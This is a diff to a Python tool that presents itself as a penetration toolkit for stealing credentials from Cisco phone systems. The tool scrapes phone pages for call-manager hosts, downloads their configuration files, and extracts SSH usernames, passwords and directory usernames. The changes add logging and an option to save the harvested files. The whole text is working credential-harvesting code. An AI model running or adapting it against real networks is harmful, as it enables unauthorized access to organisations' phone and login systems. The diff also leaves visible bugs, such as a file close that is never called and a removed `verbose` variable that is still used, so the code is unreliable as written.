@@ -1,7 +1,14 @@
 import argparse
 import requests
 import re
+import os.path
 from bs4 import BeautifulSoup as bs
+from datetime import datetime
+
+def log(message, level):
+    if level > verbosity: return
+    dt = datetime.today().strftime('%Y%m%d-%H:%M:%S')
+    print(f'[{dt}] {message}')
 
 def parse_cucm(html):
     hosts = []
@@ -61,16 +68,14 @@ def get_confpage(phoneip):
             __http_response = requests.get(url)
         return __http_response.text
     except Exception as e:
-        if verbose:
-            print(f'Failed getting conf page from {phoneip}:', e)
+        log(f'Failed getting conf page from {phoneip}: {e}', VERBOSE)
 
 def scrape_phone(phoneip):
     phone_confpage = get_confpage(phoneip)
     return (parse_phone_hostname(phone_confpage, phoneip),
             parse_cucm(phone_confpage))
 
-def search_for_secrets(cucm_hosts, phone_hostname):
-    print('Got', cucm_hosts, phone_hostname)
+def search_for_secrets(cucm_hosts, phone_hostname, save_dir):
     global found_credentials
     global found_usernames
     lines = str()
@@ -87,14 +92,22 @@ def search_for_secrets(cucm_hosts, phone_hostname):
         if not cucm_host: continue
         url = f'http://{cucm_host}:6970/{config_file}'
         try:
-            __http_response = requests.get(url, timeout=5)
+            __http_response = requests.get(url, timeout=3)
             if __http_response.status_code == 404:
                 if verbose:
                     print(f'Config file not found at {url}')
                 continue
             else:
                 lines = __http_response.text
-            
+                if save_dir:
+                    try:
+                        fh = open(os.path.join(save_dir,
+                            f'{cucm_host}_{config_file}'), 'w')
+                        fh.write(lines)
+                        fh.close
+                    except FileNotFoundError as e:
+                        log(f'Failed saving the conf file {e}', INFO)
+
             for line in lines.split('\n'):
                 if not (match := creds_re.search(line)): continue
                 if match.group(2):
@@ -110,54 +123,62 @@ def search_for_secrets(cucm_hosts, phone_hostname):
                     user2 = match.group(5)
                     found_credentials.append(('unknown',password,filename))
         except Exception as e:
-            print(f'Error during secret search at {url}: {e}')
+            log(f'Error during secret search at {url}: {e}', VERBOSE)
         else:
             if not verbose: continue
             if user and password:
-                print(f'{config_file}\t{user}\t{password}')
+                log(f'{config_file}\t{user}\t{password}', VERBOSE)
             elif user:
-                print(f'SSH Username is {user} password was not set in {config_file}')
+                log(f'SSH Username is {user} password was not set in {config_file}', VERBOSE)
             elif password:
-                print(f'SSH Username is not set, but password is {password} in {config_file}')
+                log(f'SSH Username is not set, but password is {password} in {config_file}', VERBOSE)
             elif user2:
-                print(f'Possible AD username {user2} found in config {config_file}')
+                log(f'Possible AD username {user2} found in config {config_file}', VERBOSE)
             else:
                 print(f'Username and password not set in {config_file}')
+            #break
 
 if __name__ == '__main__':
     global found_usernames
     global found_credentials
 
-    parser = argparse.ArgumentParser(description='Penetration Toolkit for attacking Cisco Phone Systems by stealing credentials from phone configuration files')
-    parser.add_argument('-pl', '--phonelist', type=str, help='A file with a list of phone IP addresses')
-    parser.add_argument('-v','--verbose', action='store_true', default=False, help='Enable Verbose Logging')
-    parser.add_argument('-p','--phone', type=str, help='IP Address of a Cisco Phone')
-    
+    INFO = 1
+    VERBOSE = 2
+
+    parser = argparse.ArgumentParser(
+        description='Penetration Toolkit for attacking Cisco Phone Systems' \
+        +' by stealing credentials from phone configuration files')
+    parser.add_argument('phone', type=str,
+        help='Phone IP or a file with a list of addresses')
+    parser.add_argument('-v','--verbose', action='store_true',
+        default=False, help='Enable Verbose Logging')
+    parser.add_argument('-s','--save', type=str,
+        help='Directory to save retrieved phone config files (optional)')
+
     args = parser.parse_args()
 
-    phonelist = args.phonelist
     phone = args.phone
-    verbose = args.verbose
+    verbosity = VERBOSE if args.verbose else INFO
+    save_dir = args.save
     found_credentials = []
     found_usernames = []
     file_names = ''
     hostnames = []
     phoneips = []
     
-    if phonelist:
+    if re.match(r'(?:\d+\.){3}\d+', phone):
+        phoneips.append(phone)
+    else:
         try:
-            phoneips = open(phonelist).read().split('\n')
+            phoneips = open(phone).read().split('\n')
         except FileNotFoundError as e:
-            print(e)
+            print('Could not open list file', e)
             quit(1)
 
-    if phone:
-        phoneips.append(phone)
-
     if not len(phoneips):
-        print('Got nothing to work with. Provide either a --phonelist or --phone')
+        print('Got nothing to work with, provide a phone IP or a file with a list of addresses')
         quit(1)
-        
+
     for phoneip in phoneips:
         (phone_hostname, cucm_hosts) = scrape_phone(phoneip)
         if not cucm_hosts:
@@ -166,7 +187,7 @@ if __name__ == '__main__':
         if not phone_hostname:
             print(f'No hostname found for {phoneip}')
             continue
-        search_for_secrets(cucm_hosts, phone_hostname)
+        search_for_secrets(cucm_hosts, phone_hostname, save_dir)
 
     if found_credentials != []:
         print('Credentials Found in Configurations!')
